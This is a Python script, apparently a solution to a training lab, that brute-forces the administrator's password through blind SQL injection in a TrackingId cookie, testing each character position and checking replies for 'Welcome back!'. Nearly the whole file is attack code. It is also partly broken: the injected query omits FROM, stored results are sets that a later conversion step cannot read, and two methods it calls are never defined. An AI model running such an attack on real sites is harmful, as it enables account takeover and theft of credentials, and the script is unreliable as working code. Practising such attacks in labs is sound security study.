import requests


class PassFinder:
    array = ['0', '1', '2', '3','4', '5', '6', '7', '8', '9',
             'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
         'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
         'u', 'v', 'w', 'x', 'y', 'z']

    def __init__(self, url):
        self.url = url
        self.cookie = ""
        self.query = ""
        self.password = []
        self.passwordLength = 20


    def set_cookie(self, input):
        self.cookie = input


    def get_cookie(self):
        return "TrackingId=asd"


    def get_query(self, number, char):
        asd = f"' AND (SELECT SUBSTRING(password,{number},1) users WHERE username='administrator')='{char}'--"
        return asd


    def set_url(self, url):
        self.url = url


    def convertToCharArr(self, array):
        resultArr = []
        for e in array:
            resultArr.append(e['character'])
        return resultArr


    def sendRequest(self, number, char):
        cookieValue = self.get_cookie()
        queryValue = self.get_query(number, char)
        requestCookie = cookieValue + queryValue
        headers = {
            "Cookie": requestCookie,
        }
        response = requests.get(self.url, headers=headers)
        return response.text


    def isExpectedResult(self, input, searchTerm):
        index = input.find(searchTerm)
        return index != -1



    def findPass(self):
        for char in self.array:
            for number in range(21):
                if (number == 0):
                    continue
                self.handleRequest(number, char)
        self.password = self.bubbleSortByPosition(self.password)
        passwordArray = self.convertToCharArr(self.password)
        self.writeResultToTxt(passwordArray)
            
    
    def handleRequest(self, number, char):
        if (len(self.password) == 20): return
        res = self.sendRequest(str(number), char)
        if self.isExpectedResult(res, "Welcome back!"):
            print({number, char})
            json_obj = {
                # "position": number,
                # "character": char
                char
            }
            self.password.append(json_obj)
            asd = self.bubbleSortByPosition(self.password)
            print(asd)

        
        
        

    